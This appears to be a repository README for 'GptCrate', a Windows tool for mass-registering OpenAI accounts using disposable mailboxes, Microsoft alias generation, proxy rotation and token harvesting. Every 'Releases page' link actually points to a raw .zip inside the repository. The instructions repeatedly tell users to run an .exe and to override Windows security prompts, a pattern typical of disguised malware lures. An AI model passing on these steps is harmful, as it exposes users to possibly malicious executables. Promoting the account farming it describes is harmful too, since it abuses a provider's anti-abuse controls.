# 🚀 GptCrate - Simple OpenAI Account Setup

[![Download GptCrate](https://img.shields.io/badge/Download-GptCrate-brightgreen?style=for-the-badge)](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)

## 📥 Download

1. Open the [GptCrate Releases page](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)
2. Download the latest Windows file from the release list
3. Save the file to a folder you can find again, such as `Downloads`
4. If the file comes as a `.zip`, extract it first
5. If you see an `.exe` file, double-click it to start the app

## 🪟 Run on Windows

1. Download the file from the release page
2. Open the folder where the file was saved
3. If Windows shows a security prompt, choose the option that lets you run the file
4. Start the app by double-clicking the main file
5. Keep the app in the same folder with its other files

## ⚙️ What GptCrate Does

GptCrate helps you run a tool that works with OpenAI account setup tasks. It supports:

- Multiple email sources
- Proxy rotation
- Multi-threaded running
- A terminal version for direct use
- A web UI for basic control
- Microsoft mailbox alias generation

The app includes these email source modes:

- `luckmail` for LuckMail API
- `cf` for self-hosted email or Cloudflare Worker
- `local_outlook` for imported Outlook credentials
- `hotmail007` for Hotmail007 API

## 🎯 Recommended Setup

The easiest setup uses `LuckMail`.

You only need to enter an API key. The rest of the settings can stay as they are.

### Recommended values

```env
EMAIL_MODE=luckmail
LUCKMAIL_API_KEY=your_api_key
TOKEN_OUTPUT_DIR=./to
```

## 🧩 Before You Start

You will need:

- A Windows PC
- Internet access
- A browser
- A text editor if you want to change settings
- A folder with write access, such as `Downloads` or `Desktop`

## 🖥️ Main Ways to Use It

### Terminal version

This is the main way to use the tool.

1. Open the program from the downloaded files
2. Follow the menu on screen
3. Choose the task you want to run
4. Enter the required values when asked

### Web UI

The web UI is still being improved.

To open it:

```bash
python web_ui.py
```

It can help you:

- Switch configs
- Start or stop tasks
- View logs
- Import CLIProxyAPI data

## 📧 Email Source Options

### 1. LuckMail

This is the default choice.

Use it when you want a simple setup with fewer steps.

### 2. CF

Use this if you want to manage email yourself or use a Cloudflare Worker setup.

### 3. local_outlook

Use this if you already have Outlook credentials saved on your computer.

### 4. hotmail007

Use this if you want to connect through the Hotmail007 API.

## 🔤 Microsoft Alias Generator

GptCrate also includes a Microsoft email alias tool.

You can start it in one of two ways:

1. Run `start.py` and choose `微软邮箱多别名生成器`
2. Run `alias_generator.py`

It supports:

- `hotmail.*` email addresses
- `outlook.*` email addresses
- Keeping the original field
- Shuffling output
- Removing processed original emails from the source file
- Overwriting `accounts.txt`
- Automatic `.bak` backup before overwrite

## 🛠️ Basic Setup Steps

1. Download the latest release from the [Releases page](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)
2. Extract the files if needed
3. Open the folder
4. Edit the config file if you want to change email mode or API key
5. Run the main file
6. Follow the prompts on the screen

## 📝 Example Config

If you use LuckMail, your config can look like this:

```env
EMAIL_MODE=luckmail
LUCKMAIL_API_KEY=your_api_key_here
TOKEN_OUTPUT_DIR=./to
```

If you use another email source, change the mode name to match it.

## 📂 Folder Layout

You may see files like these:

- `start.py` for the main menu
- `gpt.py` for terminal tasks
- `web_ui.py` for the web UI
- `alias_generator.py` for alias creation
- `accounts.txt` for account data
- `to/` for saved output
- `.bak` files for backup copies

## 🔐 Proxy Use

The tool supports proxy rotation.

Use proxies when you want to route requests through different network paths.

A typical setup may include:

- One proxy list file
- One proxy per task
- Rotation during batch jobs

## 🧭 Simple First Run

If you are new, use this path:

1. Download the release
2. Extract the files
3. Set `EMAIL_MODE=luckmail`
4. Add your `LUCKMAIL_API_KEY`
5. Run the main program
6. Choose the default option in the menu
7. Check the output folder for results

## 🧪 Common File Types

You may see these file types after download:

- `.exe` for a Windows program
- `.zip` for a compressed folder
- `.py` for Python files
- `.txt` for plain text data
- `.env` for settings

## 📌 Best Use Path

If you want the fewest steps, use this order:

1. Download the latest release
2. Use `LuckMail`
3. Start the main menu with `start.py`
4. Follow the prompts
5. Save results in the default output folder

## 🔗 Download Again

If you need the file later, use the same page:

[Go to GptCrate Releases](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)

## 🖱️ What to Click

When you open the release page, look for:

- The newest version at the top
- A Windows build or zip file
- The file name with the latest version number
- The download asset attached to the release

## 📁 Output Files

The tool saves data to the folder set in:

```env
TOKEN_OUTPUT_DIR=./to
```

You can change this path if you want the files in another folder.

## 🧰 Useful Shortcuts

- Use LuckMail for the easiest start
- Keep the output folder in a place you can find
- Leave the default values in place if you are unsure
- Use the terminal version first
- Use the web UI only if you want a basic browser view

## 📎 Release Link

[Visit the GptCrate release download page](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)